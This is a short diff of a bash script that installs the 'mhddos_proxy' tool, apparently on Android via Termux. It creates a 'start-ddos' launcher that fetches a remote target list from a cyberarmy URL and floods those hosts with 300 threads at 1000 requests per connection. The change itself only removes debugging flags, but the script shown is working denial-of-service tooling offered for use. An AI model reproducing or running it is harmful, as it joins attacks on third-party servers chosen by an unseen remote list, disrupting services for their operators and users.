@@ -1,6 +1,5 @@
 #!/bin/bash
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling mhdoos_proxy\033[0;0m\n"
-set -xe
 apt update 
 apt upgrade -y
 pkg install python3 -y
@@ -27,5 +26,3 @@ cd ~/storage/shared/mhddos_proxy
 exec python3 runner.py -c https://targets.cyberarmy.com.ua/targets.txt -t 300 --rpc 1000 \$@
 EOF
 chmod +x start-ddos
-
-set +xe
